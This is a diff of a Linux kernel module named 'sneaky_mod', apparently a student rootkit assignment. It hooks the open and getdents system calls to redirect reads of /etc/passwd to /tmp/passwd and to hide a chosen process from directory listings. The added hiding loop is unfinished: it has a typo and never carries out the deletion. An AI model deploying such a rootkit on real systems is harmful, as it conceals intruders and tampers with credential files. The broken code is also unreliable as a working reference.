@@ -27,8 +27,8 @@
   "sneaky_module from: ls, cd, find, ls /proc, ps, lsmod.\ncat /etc/passwd "   \
   "shows /tmp/passwd"
 
-static int sneaky_pid =
-    0; // Module Param -- Take pid of sneaky process as input
+// Module Param -- Take pid of sneaky process as input
+static int sneaky_pid = 0;
 module_param(sneaky_pid, int, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP);
 MODULE_PARM_DESC(sneaky_pid, "PID of sneaky process.");
 
@@ -82,6 +82,8 @@ asmlinkage int (*original_getdents_call)(unsigned int fd,
 char sneaky_pid_str[BUFFER_LEN];
 const char *sneaky_process = "sneaky_process";
 int nread = -1;
+struct linux_dirent *d;
+unsigned short bpos;
 
 // open
 const char *passwd_path = "/etc/passwd";
@@ -91,24 +93,13 @@ const char *tmp_path = "/tmp/passwd";
 const char *sneaky_mod = "sneaky_mod";
 /*-----------------------------------------------------------------*/
 
-// Define our new sneaky version of the 'open' syscall
-asmlinkage int sneaky_sys_open(const char *pathname, int flags) {
-  printk_ratelimited(KERN_INFO "Sneaky: Open syscall\n");
-
-  if (!(strcmp(pathname, passwd_path))) {
-    printk_ratelimited(KERN_INFO "matched /etc/passwd... %s\n", pathname);
-    copy_to_user((char *)pathname, tmp_path, strlen(tmp_path));
-    printk_ratelimited(KERN_INFO "User Space path: %s\n", pathname);
-  }
-
-  return original_open_call((const char *)pathname, flags);
-}
-
+// Define our new sneaky version of the 'read' syscall
 asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count) {
   printk_ratelimited(KERN_INFO "Sneaky: Read syscall\n");
   return original_read_call(fd, buf, count);
 }
 
+// Define our new sneaky version of the 'getdents' syscall
 asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp,
                                    unsigned int count) {
   printk_ratelimited(KERN_INFO "Sneaky: getdents syscall\n");
@@ -120,7 +111,37 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp,
   snprintf(sneaky_pid_str, BUFFER_LEN, "%d", sneaky_pid);
   printk_ratelimited(KERN_INFO "getdents: sneaky_pid_str = %s\n",
                      sneaky_pid_str);
+
+  for (bpos = 0; bpos < nread;) {
+    d = (struct linux_dirent *)((char *)dirp + bpos);
+    // find sneaky_process related stuff and remove
+    if ((!(strcmp(d->d_name, sneaky_pid_str))) ||
+        (strstr(d->d_name, sneaky_process))) {
+      printk_ratelimited(KERN_INFO "getdents: name match: %s", d->d_name);
+      // memmove to delete entry
+      void *src = (void *)d + d->d_reclen;
+      void *dest = (viod *)d;
+    }
+
+    bpos += d->d_reclen;
+  }
+
   return nread;
+}
+
+// Define our new sneaky version of the 'open' syscall
+asmlinkage int sneaky_sys_open(const char *pathname, int flags) {
+  printk_ratelimited(KERN_INFO "Sneaky: Open syscall\n");
+
+  if (!(strcmp(pathname, passwd_path))) {
+    printk_ratelimited(KERN_INFO "Sneaky Open: matched /etc/passwd... %s\n",
+                       pathname);
+    copy_to_user((char *)pathname, tmp_path, strlen(tmp_path));
+    printk_ratelimited(KERN_INFO "Sneaky Open: User Space path - %s\n",
+                       pathname);
+  }
+
+  return original_open_call((const char *)pathname, flags);
 }
 
 // The code that gets executed when the module is loaded
